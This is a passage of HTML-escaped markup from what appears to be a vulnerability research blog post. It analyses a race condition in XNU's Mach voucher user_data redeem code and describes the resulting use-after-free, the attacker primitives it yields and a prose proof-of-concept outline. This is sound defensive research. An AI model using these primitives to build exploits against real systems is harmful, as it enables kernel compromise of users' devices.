class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;e_made&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; elem&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;e_made&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;++;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;out_value &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;prev_values&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;[&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;0&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;];&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;return&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;KERN_SUCCESS&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* redeem of default is default */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;out_value &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;0&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;return&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;KERN_SUCCESS&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;As mentioned before, it&amp;#39;s up to the attr managers themselves to define the semantics of redeeming a voucher; the entirety of the user_data semantics for voucher redemption are shown above. It simply returns the previous value, with &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;incremented by 1. Recall that &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;*prev_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;is either the value which was previously in this under-construction voucher for this key, or the value in the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;prev_voucher&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;referenced by this sub-recipe.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;If you can&amp;#39;t spot the bug above in the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;MACH_VOUCHER_ATTR_REDEEM&lt;/span&gt;&lt;span&gt;&amp;nbsp;code right away that&amp;#39;s because it&amp;#39;s a bug of omission; it&amp;#39;s what&amp;#39;s &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c17\"&gt;not&lt;/span&gt;&lt;span&gt;&amp;nbsp;there that causes the vulnerability, namely that the increment in the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;MACH_VOUCHER_ATTR_REDEEM&lt;/span&gt;&lt;span&gt;&amp;nbsp;case isn&amp;#39;t protected by the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;lock! This increment isn&amp;#39;t atomic.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;That means that if the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;MACH_VOUCHER_ATTR_REDEEM&lt;/span&gt;&lt;span&gt;&amp;nbsp;code executes in parallel with either itself on another thread or the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;elem-&amp;gt;e_made++&lt;/span&gt;&lt;span&gt;&amp;nbsp;increment in &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data_dedup&lt;/span&gt;&lt;span&gt;&amp;nbsp;on another thread, the two threads can both see the same initial value for &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;e_made&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;, both add one then both write the same value back; incrementing it by one when it should have been incremented by two.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;But remember, &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;isn&amp;#39;t a reference count! So actually making something bad happen isn&amp;#39;t as simple as just getting the two threads to align such that their increments overlap so that &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;e_made&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;is wrong.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;Let&amp;#39;s think back to what the purpose of &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;is: it exists solely to ensure that if thread A drops the last ref on an &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;nbsp;whilst thread B is exactly in the race window shown below, that thread&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;doesn&amp;#39;t free &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;new_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;on thread B&amp;#39;s stack:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.6678b43a7a459c004d346e8b4b835a591c986cfd\"&gt;&lt;/a&gt;&lt;a id=\"t.56\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; kr &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivam&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivam_get_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)(&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivam&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;key&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;command&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; previous_vals&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;previous_vals_count&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; content&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;content_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;new_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;new_flag&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;new_value_voucher&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;KERN_SUCCESS &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;!=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;kr&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_release&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;return&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;kr&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;...&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* WINDOW */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; val_index &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;ivace_reference_by_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;new_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;new_flag&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;And the reason the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;nbsp;doesn&amp;#39;t get freed by thread A is because in that window, &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;will always be &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c17\"&gt;larger&lt;/span&gt;&lt;span&gt;&amp;nbsp;than the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace-&amp;gt;ivace_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;value for any &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;nbsp;which has a pointer to that &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;. &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;is larger because the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;increment always happens &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c17\"&gt;before&lt;/span&gt;&lt;span&gt;&amp;nbsp;any &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_made&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;increment.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;This is why the absolute value of &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;isn&amp;#39;t important; all that matters is whether or not it&amp;#39;s equal to &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_made&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;. And the only purpose of that is to determine whether there&amp;#39;s another thread in that window shown above.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;So how can we make something bad happen? Well, let&amp;#39;s assume that we successfully trigger the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;non-atomic increment and end up with a value of &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;which is one less than &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_made&lt;/span&gt;&lt;span&gt;. What does this do to the race window detection logic? It completely flips it! If, in the steady-state &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;is one less than &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;then we race two threads; thread A which is dropping the last &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_ref&lt;/span&gt;&lt;span&gt;&amp;nbsp;and thread B which is attempting to revive it and thread B is in the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c23\"&gt;WINDOW&lt;/span&gt;&lt;span&gt;&amp;nbsp;shown above then &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;gets incremented before &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_made&lt;/span&gt;&lt;span&gt;, but since &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;started out one &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c17\"&gt;lower&lt;/span&gt;&lt;span&gt;&amp;nbsp;than &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;(due to the successful earlier trigger of the non-atomic increment) then &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;is now exactly &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c17\"&gt;equal&lt;/span&gt;&lt;span&gt;&amp;nbsp;to &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_made&lt;/span&gt;&lt;span&gt;; the exact condition which indicates we cannot possibly be in the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c23\"&gt;WINDOW&lt;/span&gt;&lt;span&gt;&amp;nbsp;shown above, and it&amp;#39;s safe to free the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data_value_element&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;which is in fact live on thread B&amp;#39;s stack!&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;Thread B then ends up with a revived &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;nbsp;with a dangling &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;This gives an attacker two primitives that together would be more than sufficient to successfully exploit this bug: the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;mach_voucher_extract_attr_content&lt;/span&gt;&lt;span&gt;&amp;nbsp;voucher port MIG method would allow reading memory through the dangling &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;pointer, and deallocating the voucher port would allow a controlled extra &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;kfree&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;of the dangling pointer.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;With the insight that you need to trigger these two race windows (the non-atomic increment to make &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;one too low, then the last-ref vs revive race) it&amp;#39;s trivial to write a PoC to demonstrate the issue; simply allocate and deallocate voucher ports on two threads, with at least one of them using a &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;MACH_VOUCHER_ATTR_REDEEM&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;sub-recipe command. Pretty quickly you&amp;#39;ll hit the two race conditions correctly.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"BGLtzooHlW-c18 BGLtzooHlW-c5\" id=\"h.fapbpabhxf26\"&gt;&lt;span&gt;Conclusions&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;It&amp;#39;s interesting to think about how this vulnerability might have been found. Certainly somebody did find it, and trying to figure out how they might have done that can help us improve our vulnerability research techniques. I&amp;#39;ll offer four possibilities:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;1) Just read the code&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;Possible, but this vulnerability is quite deep in the code. This would have been a marathon auditing effort to find and determine that it was exploitable. On the other hand this attack surface is reachable from every sandbox making vulnerabilities here very valuable and perhaps worth the investment.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;2) Static lock-analysis tooling&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;This is something which we&amp;#39;ve discussed within Project Zero over many afternoon coffee chats: could we build a tool to generate a fuzzy mapping between locks and objects which are probably meant to be protected by those locks, and then list any discrepancies where the lock isn&amp;#39;t held? In this particular case &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;is only modified in two places; one time the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data_lock&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;is held and the other time it isn&amp;#39;t. Perhaps tooling isn&amp;#39;t even required and this could just be a technique used to help guide auditing towards possible race-condition vulnerabilities.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;3) Dynamic lock-analysis tooling&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;Perhaps tools like &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c21\"&gt;&lt;a 